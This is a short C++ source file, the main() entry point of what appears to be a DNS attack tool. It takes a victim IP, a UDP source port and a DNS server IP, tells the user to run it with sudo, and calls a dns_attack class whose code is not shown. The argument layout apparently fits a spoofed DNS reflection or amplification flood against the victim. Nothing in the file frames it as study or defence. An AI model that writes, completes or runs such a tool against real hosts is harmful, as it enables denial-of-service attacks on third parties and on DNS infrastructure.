#include "dns_attack.h"
#include <cstdlib>
#include <cstring>
#include <string>
#include <iostream>

int main(int argc, char* argv[]) {
	std::cout << "[Notice] If the operation is not permitted. Please use sudo to run it again." << std::endl;
	if (argc != 4) {
		std::cout << "Usage: " << argv[0]
		<< " <Victim IP> <UDP Source Port> <DNS Server IP>" << std::endl;
		return 0;
	}

	std::string Victim_IP = "", Server_IP = "";
	int Source_Port = atoi(argv[2]);

	for (int i = 0; i < strlen(argv[1]); ++i)
		Victim_IP.push_back(argv[1][i]);
	for (int i = 0; i < strlen(argv[3]); ++i)
		Server_IP.push_back(argv[3][i]);

	dns_attack attack(Victim_IP, Source_Port, Server_IP);
	attack.attack();

	return 0;
}
